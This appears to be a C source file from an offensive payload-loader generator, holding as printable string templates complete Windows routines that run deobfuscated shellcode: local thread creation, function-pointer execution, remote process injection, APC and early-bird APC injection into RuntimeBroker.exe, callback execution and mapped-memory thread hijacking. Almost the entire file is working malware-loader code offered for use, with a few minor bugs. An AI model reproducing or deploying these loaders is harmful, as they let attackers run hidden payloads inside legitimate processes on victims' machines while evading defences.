#include <windows.h>
#include <stdio.h>
#include "Common.h"

//Injections
char _CreateThread[] =
"int wmain1(void)\n"
"{\n"

"    //Create Buffer for Shellcode\n"
"    PVOID pShellcodeAddress = VirtualAlloc(NULL, sDeobfuscatedSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);\n"
"    if (pShellcodeAddress == NULL)\n"
"    {\n"
"        printf(\"[#] Error Allocating memory\");\n"
"    }\n\n"
"    //Copy the Shellcode to the Buffer created\n"
"    memcpy(pShellcodeAddress, pDeobfuscatedPayload, sDeobfuscatedSize);\n\n"
"    //Fill the Buffer with 0s\n"
"    memset(pDeobfuscatedPayload, '\\0', sDeobfuscatedSize);\n\n"
"    //Change the Permissions of the Buffer Created\n"
"    DWORD dwOldProction = NULL;\n\n"
"    if (VirtualProtect(pShellcodeAddress, sDeobfuscatedSize, PAGE_EXECUTE_READWRITE, &dwOldProction) == NULL)\n"
"    {\n"
"        printf(\"[#] Error changing the Memory Stage to execute , error code: %d\\n\", GetLastError());\n"
"    }\n\n"
"    //Create a Thread to the shellcode be executable\n"
"    HANDLE hThread = CreateThread(NULL, 0, pShellcodeAddress, NULL, 0, NULL);\n"
"    WaitForSingleObject(hThread, INFINITE);\n\n"
"    HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);\n"	
"    return 0;\n"
"}\n";



char _Function_Pointer[] =
"typedef VOID(WINAPI* fnShellcodefunc)();\n\n"
"int wmain1(void)\n"
"{\n"
"    PVOID pShellcodeAddress = VirtualAlloc(NULL, sDeobfuscatedSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);\n"
"    if (pShellcodeAddress == NULL)\n"
"    {\n"
"        printf(\"[#] Error Allocating memory\");\n"
"    }\n\n"
"    //Copy the Shellcode to the Buffer created\n"
"    memcpy(pShellcodeAddress, pDeobfuscatedPayload, sDeobfuscatedSize);\n\n"
"    //Fill the Buffer with 0s\n"
"    memset(pDeobfuscatedPayload, '\\0', sDeobfuscatedSize);\n\n"
"    //Change the Permissions of the Buffer Created\n"
"    DWORD dwOldProction = NULL;\n\n"
"    if (VirtualProtect(pShellcodeAddress, sDeobfuscatedSize, PAGE_EXECUTE_READWRITE, &dwOldProction) == NULL)\n"
"    {\n"
"        printf(\"[#] Error changing the Memory Stage to execute , error code: %d\\n\", GetLastError());\n"
"    }\n\n"
"    //Run with Pointer Function\n"
"    fnShellcodefunc pShell = (fnShellcodefunc)pShellcodeAddress;\n"
"    pShell();\n\n"
"    HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);\n"
"    return 0;\n"
"}\n";


char _Process_Injection[] =
"#include <tlhelp32.h>\n"
"\n"
"BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {\n"
"    PROCESSENTRY32 Proc = {\n"
"        .dwSize = sizeof(PROCESSENTRY32)\n"
"    };\n"
"    HANDLE hSnapShot = NULL;\n"
"    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);\n"
"    if (hSnapShot == INVALID_HANDLE_VALUE) {\n"
"        printf(\"[!] CreateToolhelp32Snapshot Failed With Error : %d \\n\", GetLastError());\n"
"        goto _EndOfFunction;\n"
"    }\n"
"    if (!Process32First(hSnapShot, &Proc)) {\n"
"        printf(\"[!] Process32First Failed With Error : %d \\n\", GetLastError());\n"
"        goto _EndOfFunction;\n"
"    }\n"
"    do {\n"
"        WCHAR LowerName[MAX_PATH * 2];\n"
"        if (Proc.szExeFile) {\n"
"            DWORD dwSize = lstrlenW(Proc.szExeFile);\n"
"            DWORD i = 0;\n"
"            RtlSecureZeroMemory(LowerName, MAX_PATH * 2);\n"
"            if (dwSize < MAX_PATH * 2) {\n"
"                for (; i < dwSize; i++)\n"
"                    LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);\n"
"                LowerName[i++] = '\\0';\n"
"            }\n"
"        }\n"
"        if (wcscmp(LowerName, szProcessName) == 0) {\n"
"            *dwProcessId = Proc.th32ProcessID;\n"
"            *hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);\n"
"            if (*hProcess == NULL)\n"
"                printf(\"[!] OpenProcess Failed With Error : %d \\n\", GetLastError());\n"
"            break;\n"
"        }\n"
"    } while (Process32Next(hSnapShot, &Proc));\n"
"_EndOfFunction:\n"
"    if (hSnapShot != NULL)\n"
"        CloseHandle(hSnapShot);\n"
"    if (*dwProcessId == NULL || *hProcess == NULL)\n"
"        return FALSE;\n"
"    return TRUE;\n"
"}\n"
"\n"
"BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode) {\n"
"    PVOID pShellcodeAddress = NULL;\n"
"    SIZE_T sNumberOfBytesWritten = NULL;\n"
"    DWORD dwOldProtection = NULL;\n"
"    pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n"
"    if (pShellcodeAddress == NULL) {\n"
"        printf(\"[!] VirtualAllocEx Failed With Error : %d \\n\", GetLastError());\n"
"        return FALSE;\n"
"    }\n"
"    printf(\"[i] Allocated Memory At : 0x%p \\n\", pShellcodeAddress);\n"
"    printf(\"[#] Press <Enter> To Write Payload ... \");\n"
"    getchar();\n"
"    if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {\n"
"        printf(\"[!] WriteProcessMemory Failed With Error : %d \\n\", GetLastError());\n"
"        return FALSE;\n"
"    }\n"
"    printf(\"[i] Successfully Written %d Bytes\\n\", sNumberOfBytesWritten);\n"
"    memset(pShellcode, '\\0', sSizeOfShellcode);\n"
"    if (!VirtualProtectEx(hProcess, pShellcodeAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {\n"
"        printf(\"[!] VirtualProtectEx Failed With Error : %d \\n\", GetLastError());\n"
"        return FALSE;\n"
"    }\n"
"    printf(\"[#] Press <Enter> To Run ... \");\n"
"    getchar();\n"
"    printf(\"[i] Executing Payload ... \");\n"
"    if (CreateRemoteThread(hProcess, NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {\n"
"        printf(\"[!] CreateRemoteThread Failed With Error : %d \\n\", GetLastError());\n"
"        return FALSE;\n"
"    }\n"
"    printf(\"[+] DONE !\\n\");\n"
"    return TRUE;\n"
"}\n"
"\n"
"int wmain1(int argc, wchar_t* argv[]) {\n"
"    HANDLE hProcess = NULL;\n"
"    DWORD dwProcessId = NULL;\n"
"    if (argc < 2) {\n"
"        wprintf(L\"[!] Usage : \\\"%s\\\" <Process Name> \\n\", argv[0]);\n"
"        return -1;\n"
"    }\n"
"    wprintf(L\"[i] Searching For Process Id Of \\\"%s\\\" ... \", argv[1]);\n"
"    if (!GetRemoteProcessHandle(argv[1], &dwProcessId, &hProcess)) {\n"
"        printf(\"[!] Process is Not Found \\n\");\n"
"        return -1;\n"
"    }\n"
"    wprintf(L\"[+] ProcessID: %d\\n\", dwProcessId);\n"
"    printf(\"Injecting shellcode on Process: %ls\\n\", argv[1]);\n"
"    printf(\"[#] Press <Enter> To Inject ...\\n\");\n"
"    getchar();\n"
"    if (InjectShellcodeToRemoteProcess(hProcess, pDeobfuscatedPayload, sDeobfuscatedSize)) {\n"
"        wprintf(\"Failed to inject payload on Process: %ls\", argv[1]);\n"
"    }\n"
"    VirtualFreeEx(hProcess, pDeobfuscatedPayload, sDeobfuscatedSize, MEM_RELEASE);\n"
"}\n";



char _APC[] =
"VOID AlertableFunction5() {\n"
"    HANDLE hEvent1 = CreateEvent(NULL, NULL, NULL, NULL);\n"
"    HANDLE hEvent2 = CreateEvent(NULL, NULL, NULL, NULL);\n"
"    if (hEvent1 && hEvent2) {\n"
"        SignalObjectAndWait(hEvent1, hEvent2, INFINITE, TRUE);\n"
"        CloseHandle(hEvent1);\n"
"        CloseHandle(hEvent2);\n"
"    }\n"
"}\n"
"\n"
"BOOL RunViaApcInjection(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {\n"
"    PVOID pAddress = NULL;\n"
"    DWORD dwOldProtection = NULL;\n"
"    pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n"
"    if (pAddress == NULL) {\n"
"        printf(\"\\t[!] VirtualAlloc Failed With Error : %d \\n\", GetLastError());\n"
"        return FALSE;\n"
"    }\n"
"    memcpy(pAddress, pPayload, sPayloadSize);\n"
"    if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {\n"
"        printf(\"\\t[!] VirtualProtect Failed With Error : %d \\n\", GetLastError());\n"
"        return FALSE;\n"
"    }\n"
"    // If hThread is in an alertable state, QueueUserAPC will run the payload directly\n"
"    // If hThread is in a suspended state, the payload won't be executed unless the thread is resumed after\n"
"    if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {\n"
"        printf(\"\\t[!] QueueUserAPC Failed With Error : %d \\n\", GetLastError());\n"
"        return FALSE;\n"
"    }\n"
"    return TRUE;\n"
"}\n"
"\n"
"int wmain1(void) {\n\n"
"    HANDLE hThread = NULL;\n"
"    DWORD dwThreadId = NULL;\n\n"
"    printf(\"[i] Creating Local Thread\\n\");\n"
"    printf(\"[i] Press ENTER TO PASS\\n\");\n"
"    getchar();\n\n"
"    hThread = CreateThread(NULL, NULL, &AlertableFunction5, NULL, NULL, &dwThreadId);\n"
"    if (hThread == NULL) {\n"
"        printf(\"[!] CreateThread Failed With Error : %d \\n\", GetLastError());\n"
"        return FALSE;\n"
"    }\n\n"
"    printf(\"[+] Alertable Target Thread Created With Id : %d \\n\", dwThreadId);\n"
"    printf(\"[i] Press ENTER TO PASS\\n\");\n"
"    getchar();\n\n"
"    printf(\"[i] APC Injection\\n\");\n"
"    if (!RunViaApcInjection(hThread, pDeobfuscatedPayload, sDeobfuscatedSize)) {\n"
"        printf(\"[!] RunViaApcInjection failed, error code: %d\\n\", GetLastError());\n"
"    }\n\n"
"    printf(\"[+] DONE\\n\");\n"
"    WaitForSingleObject(hThread, INFINITE);\n"
"}\n";



char _EB_APC_DP[] =
"BOOL CreateSuspendedProcess2(LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread) {\n"
"    CHAR lpPath[MAX_PATH * 2];\n"
"    CHAR WnDr[MAX_PATH];\n"
"    STARTUPINFO Si = { 0 };\n"
"    PROCESS_INFORMATION Pi = { 0 };\n"
"    RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));\n"
"    RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));\n"
"    Si.cb = sizeof(STARTUPINFO);\n"
"    if (!GetEnvironmentVariableA(\"WINDIR\", WnDr, MAX_PATH)) {\n"
"        printf(\"[!] GetEnvironmentVariableA Failed With Error : %d \\n\", GetLastError());\n"
"        return FALSE;\n"
"    }\n"
"    sprintf(lpPath, \"%s\\\\System32\\\\%s\", WnDr, lpProcessName);\n"
"    printf(\"\\n\\t[i] Running : \\\"%s\\\" ... \", lpPath);\n"
"    if (!CreateProcessA(NULL, lpPath, NULL, NULL, FALSE, DEBUG_PROCESS, NULL, NULL, &Si, &Pi)) {\n"
"        printf(\"[!] CreateProcessA Failed with Error : %d \\n\", GetLastError());\n"
"        return FALSE;\n"
"    }\n"
"    printf(\"[+] DONE \\n\");\n"
"    *dwProcessId = Pi.dwProcessId;\n"
"    *hProcess = Pi.hProcess;\n"
"    *hThread = Pi.hThread;\n"
"    if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)\n"
"        return TRUE;\n"
"    return FALSE;\n"
"}\n"
"\n"
"BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode, PVOID* ppAddress) {\n"
"    SIZE_T sNumberOfBytesWritten = NULL;\n"
"    DWORD dwOldProtection = NULL;\n"
"    *ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n"
"    if (*ppAddress == NULL) {\n"
"        printf(\"\\n\\t[!] VirtualAllocEx Failed With Error : %d \\n\", GetLastError());\n"
"        return FALSE;\n"
"    }\n"
"    printf(\"\\n\\t[i] Allocated Memory At : 0x%p \\n\", *ppAddress);\n"
"    printf(\"\\t[#] Press <Enter> To Write Payload ... \");\n"
"    getchar();\n"
"    if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {\n"
"        printf(\"\\n\\t[!] WriteProcessMemory Failed With Error : %d \\n\", GetLastError());\n"
"        return FALSE;\n"
"    }\n"
"    printf(\"\\t[i] Successfully Written %d Bytes\\n\", sNumberOfBytesWritten);\n"
"    if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {\n"
"        printf(\"\\n\\t[!] VirtualProtectEx Failed With Error : %d \\n\", GetLastError());\n"
"        return FALSE;\n"
"    }\n"
"    return TRUE;\n"
"}\n"
"\n"
"int wmain1(void) {\n\n"
"    HANDLE hProcess = NULL;\n"
"    HANDLE hThread = NULL;\n"
"    DWORD dwProcessId = NULL;\n"
"    LPCSTR lpProcessName = \"RuntimeBroker.exe\";\n"
"    PVOID ppAddress = NULL;\n\n"
"    printf(\"[i] Creating Process %ls in Debug mode\\n\", lpProcessName);\n"
"    printf(\"[i] Press ENTER TO PASS\\n\");\n"
"    getchar();\n\n"
"    if (!CreateSuspendedProcess2(lpProcessName, &dwProcessId, &hProcess, &hThread))\n"
"    {\n"
"        printf(\"[!] CreateSuspendedProcess2 failed, error code: %d\\n\", GetLastError());\n"
"        return -1;\n"
"    }\n\n"
"    printf(\"[i] Injected to remote process %ld\\n\", dwProcessId);\n"
"    printf(\"[i] Press ENTER TO PASS\\n\");\n"
"    getchar();\n\n"
"    if (!InjectShellcodeToRemoteProcess(hProcess, pDeobfuscatedPayload, sDeobfuscatedSize, &ppAddress))\n"
"    {\n"
"        printf(\"[!] InjectShellcodeToRemoteProcess failed, error code: %d\\n\", GetLastError());\n"
"        return -1;\n"
"    }\n\n"
"    printf(\"[i] APC Injection\\n\");\n"
"    printf(\"[i] Press ENTER TO PASS\\n\");\n"
"    getchar();\n\n"
"    if (!QueueUserAPC((PAPCFUNC)ppAddress, hThread, NULL)) {\n"
"        printf(\"\\t[!] QueueUserAPC Failed With Error : %d \\n\", GetLastError());\n"
"        return -1;\n"
"    }\n\n"
"    printf(\"[i] Stop debugging to run\\n\");\n"
"    printf(\"[i] Press ENTER TO PASS\\n\");\n"
"    getchar();\n\n"
"    DebugActiveProcessStop(dwProcessId);\n"
"    WaitForSingleObject(hThread, INFINITE);\n"
"    return 0;\n"
"}\n";


char _EB_APC_SP[] =
"BOOL CreateSuspendedProcess2(LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread) {\n"
"    CHAR lpPath[MAX_PATH * 2];\n"
"    CHAR WnDr[MAX_PATH];\n"
"    STARTUPINFO Si = { 0 };\n"
"    PROCESS_INFORMATION Pi = { 0 };\n"
"    RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));\n"
"    RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));\n"
"    Si.cb = sizeof(STARTUPINFO);\n"
"    if (!GetEnvironmentVariableA(\"WINDIR\", WnDr, MAX_PATH)) {\n"
"        printf(\"[!] GetEnvironmentVariableA Failed With Error : %d \\n\", GetLastError());\n"
"        return FALSE;\n"
"    }\n"
"    sprintf(lpPath, \"%s\\\\System32\\\\%s\", WnDr, lpProcessName);\n"
"    printf(\"\\n\\t[i] Running : \\\"%s\\\" ... \", lpPath);\n"
"    if (!CreateProcessA(NULL, lpPath, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &Si, &Pi)) {\n"
"        printf(\"[!] CreateProcessA Failed with Error : %d \\n\", GetLastError());\n"
"        return FALSE;\n"
"    }\n"
"    printf(\"[+] DONE \\n\");\n"
"    *dwProcessId = Pi.dwProcessId;\n"
"    *hProcess = Pi.hProcess;\n"
"    *hThread = Pi.hThread;\n"
"    if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)\n"
"        return TRUE;\n"
"    return FALSE;\n"
"}\n"
"\n"
"BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode, PVOID* ppAddress) {\n"
"    SIZE_T	sNumberOfBytesWritten = NULL;\n"
"    DWORD	dwOldProtection = NULL;\n"
"    *ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n"
"    if (*ppAddress == NULL) {\n"
"        printf(\"\\n\\t[!] VirtualAllocEx Failed With Error : %d \\n\", GetLastError());\n"
"        return FALSE;\n"
"    }\n"
"    printf(\"\\n\\t[i] Allocated Memory At : 0x%p \\n\", *ppAddress);\n"
"    printf(\"\\t[#] Press <Enter> To Write Payload ... \");\n"
"    getchar();\n"
"    if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {\n"
"        printf(\"\\n\\t[!] WriteProcessMemory Failed With Error : %d \\n\", GetLastError());\n"
"        return FALSE;\n"
"    }\n"
"    printf(\"\\t[i] Successfully Written %d Bytes\\n\", sNumberOfBytesWritten);\n"
"    if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {\n"
"        printf(\"\\n\\t[!] VirtualProtectEx Failed With Error : %d \\n\", GetLastError());\n"
"        return FALSE;\n"
"    }\n"
"    return TRUE;\n"
"}\n"
"\n"
"int wmain1(void) {\n\n"
"    HANDLE hProcess = NULL;\n"
"    HANDLE hThread = NULL;\n"
"    DWORD dwProcessId = NULL;\n"
"    LPCSTR lpProcessName = \"RuntimeBroker.exe\";\n"
"    PVOID ppAddress = NULL;\n\n"
"    printf(\"[i] Creating Process %ls in Debug mode\\n\", lpProcessName);\n"
"    printf(\"[i] Press ENTER TO PASS\\n\");\n"
"    getchar();\n\n"
"    if (!CreateSuspendedProcess2(lpProcessName, &dwProcessId, &hProcess, &hThread))\n"
"    {\n"
"        printf(\"[!] CreateSuspendedProcess2 failed, error code: %d\\n\", GetLastError());\n"
"        return -1;\n"
"    }\n\n"
"    printf(\"[i] Injected to remote process %ld\\n\", dwProcessId);\n"
"    printf(\"[i] Press ENTER TO PASS\\n\");\n"
"    getchar();\n\n"
"    if (!InjectShellcodeToRemoteProcess(hProcess, pDeobfuscatedPayload, sDeobfuscatedSize, &ppAddress))\n"
"    {\n"
"        printf(\"[!] InjectShellcodeToRemoteProcess failed, error code: %d\\n\", GetLastError());\n"
"        return -1;\n"
"    }\n\n"
"    printf(\"[i] APC Injection\\n\");\n"
"    printf(\"[i] Press ENTER TO PASS\\n\");\n"
"    getchar();\n\n"
"    if (!QueueUserAPC((PAPCFUNC)ppAddress, hThread, NULL)) {\n"
"        printf(\"\\t[!] QueueUserAPC Failed With Error : %d \\n\", GetLastError());\n"
"        return -1;\n"
"    }\n\n"
"    printf(\"[i] Resume Thread to run \\n\");\n"
"    printf(\"[i] Press ENTER TO PASS\\n\");\n"
"    getchar();\n\n"
"    ResumeThread(hThread);\n"
"    WaitForSingleObject(hThread, INFINITE);\n"
"    return 0;\n"
"}\n";




char _CALLBACK[] =
"int wmain1(void) {\n\n"
"    HANDLE hTimer = NULL;\n"
"    PVOID pAddress = NULL;\n"
"    DWORD dwOldProtection = NULL;\n\n"
"    printf(\"[#] Allocating Memory\\n\");\n"
"    printf(\"[i] Press ENTER TO PASS\\n\");\n"
"    getchar();\n\n"
"    pAddress = VirtualAlloc(NULL, sDeobfuscatedSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n"
"    if (pAddress == NULL) {\n"
"        printf(\"\\t[!] VirtualAlloc Failed With Error : %d \\n\", GetLastError());\n"
"        return FALSE;\n"
"    }\n\n"
"    memcpy(pAddress, pDeobfuscatedPayload, sDeobfuscatedSize);\n\n"
"    if (!VirtualProtect(pAddress, sDeobfuscatedSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {\n"
"        printf(\"\\t[!] VirtualProtect Failed With Error : %d \\n\", GetLastError());\n"
"        return FALSE;\n"
"    }\n\n"
"    printf(\"[#] Running Callback Function\\n\");\n"
"    printf(\"[i] Press ENTER TO PASS\\n\");\n"
"    getchar();\n\n"
"    if (!EnumThreadWindows(0, (WNDENUMPROC)pAddress, NULL)) {\n"
"        printf(\"[!] EnumThreadWindows Failed With Error : %d \\n\", GetLastError());\n"
"        return -1;\n"
"    }\n\n"
"    return 0;\n"
"}\n";


char _LOCAL_MAPPING[] =
"BOOL LocalMapInject(IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PVOID* ppAddress) {\n"
"    BOOL   bSTATE = TRUE;\n"
"    HANDLE hFile = NULL;\n"
"    PVOID  pMapAddress = NULL;\n"
"    hFile = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sPayloadSize, NULL);\n"
"    if (hFile == NULL) {\n"
"        printf(\"[!] CreateFileMapping Failed With Error : %d \\n\", GetLastError());\n"
"        bSTATE = FALSE; goto _EndOfFunction;\n"
"    }\n"
"    pMapAddress = MapViewOfFile(hFile, FILE_MAP_WRITE | FILE_MAP_EXECUTE, NULL, NULL, sPayloadSize);\n"
"    if (pMapAddress == NULL) {\n"
"        printf(\"[!] MapViewOfFile Failed With Error : %d \\n\", GetLastError());\n"
"        bSTATE = FALSE; goto _EndOfFunction;\n"
"    }\n"
"    memcpy(pMapAddress, pPayload, sPayloadSize);\n"
"_EndOfFunction:\n"
"    *ppAddress = pMapAddress;\n"
"    if (hFile)\n"
"        CloseHandle(hFile);\n"
"    return bSTATE;\n"
"}\n"
"BOOL RunViaClassicThreadHijacking(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {\n"
"    PVOID    pAddress = NULL;\n"
"    DWORD    dwOldProtection = NULL;\n"
"    CONTEXT  ThreadCtx = {\n"
"        .ContextFlags = CONTEXT_CONTROL\n"
"    };\n"
"    pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n"
"    if (pAddress == NULL) {\n"
"        printf(\"[!] VirtualAlloc Failed With Error : %d \\n\", GetLastError());\n"
"        return FALSE;\n"
"    }\n"
"    memcpy(pAddress, pPayload, sPayloadSize);\n"
"    if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {\n"
"        printf(\"[!] VirtualProtect Failed With Error : %d \\n\", GetLastError());\n"
"        return FALSE;\n"
"    }\n"
"    if (!GetThreadContext(hThread, &ThreadCtx)) {\n"
"        printf(\"[!] GetThreadContext Failed With Error : %d \\n\", GetLastError());\n"
"        return FALSE;\n"
"    }\n"
"    ThreadCtx.Rip = (DWORD64)pAddress;\n"
"    if (!SetThreadContext(hThread, &ThreadCtx)) {\n"
"        printf(\"[!] SetThreadContext Failed With Error : %d \\n\", GetLastError());\n"
"        return FALSE;\n"
"    }\n"
"    return TRUE;\n"
"}\n\n"
"void Common() {\n"
"    printf(\"Dummy\\n\");\n"
"}\n\n"
"int wmain1(void) {\n\n"
"    PVOID ppAddress = NULL;\n"
"    HANDLE hThread = NULL;\n\n"
"    printf(\"[i] Local Mapped Memory creation \\n\");\n"
"    printf(\"[i] Press ENTER TO PASS\\n\");\n"
"    getchar();\n\n"
"    if (!LocalMapInject(pDeobfuscatedPayload, sDeobfuscatedSize, &ppAddress)) {\n"
"        printf(\"[!] LocalMapInject Failed With Error : %d \\n\", GetLastError());\n"
"        return -1;\n"
"    }\n\n"
"    printf(\"[!] Press ENTER to copy Payload to Mapped Address: %p\\n\", ppAddress);\n"
"    getchar();\n"
"    printf(\"[!] Press ENTER to create thread\");\n"
"    getchar();\n\n"
"    hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)&Common, NULL, CREATE_SUSPENDED, NULL);\n"
"    if (hThread == NULL) {\n"
"        printf(\"[!] CreateThread Failed With Error : %d \\n\", GetLastError());\n"
"        return FALSE;\n"
"    }\n\n"
"    printf(\"[!] Press ENTER to create Hijack Thread\");\n"
"    getchar();\n\n"
"    if (!RunViaClassicThreadHijacking(hThread, ppAddress, sDeobfuscatedSize)) {\n"
"        printf(\"[!] RunViaClassicThreadHijacking Failed With Error : %d \\n\", GetLastError());\n"
"        return -1;\n"
"    }\n\n"
"    printf(\"[!] Press ENTER to resume Thread\");\n"
"    getchar();\n"
"    ResumeThread(hThread);\n\n"
"    WaitForSingleObject(hThread, INFINITE);\n"
"    UnmapViewOfFile(ppAddress);\n"
"    return 0;\n\n"
"}\n";







VOID PrintInjectionFunctionality(IN INT TYPE) {
	if (TYPE == 0) {
		printf("[!] Missing Input Type (StringFunctions:362)\n");
		return;
	}

	switch (TYPE) {

	case CREATETHREAD:
		printf("%s\n", _CreateThread);
		break;
	
	case PROCESS_INJECTION:
		printf("%s\n", _Process_Injection);
		break;
	
	case FUNCTIONPOINTER:
		printf("%s\n", _Function_Pointer);
		break;

	case APC:
		printf("%s\n", _APC);
		break;
	
	case EB_APC_DP:
		printf("%s\n", _EB_APC_DP);
		break;
	
	case EB_APC_SP:
		printf("%s\n", _EB_APC_SP);
		break;
	
	case CALLBACK_ENUM:
		printf("%s\n", _CALLBACK);
		break;
	
	case LOCAL_MAPPING:
		printf("%s\n", _LOCAL_MAPPING);
		break;


	default:
		printf("[!] Unsupported Type Entered : 0x%0.8X \n", TYPE);
		break;
	}

}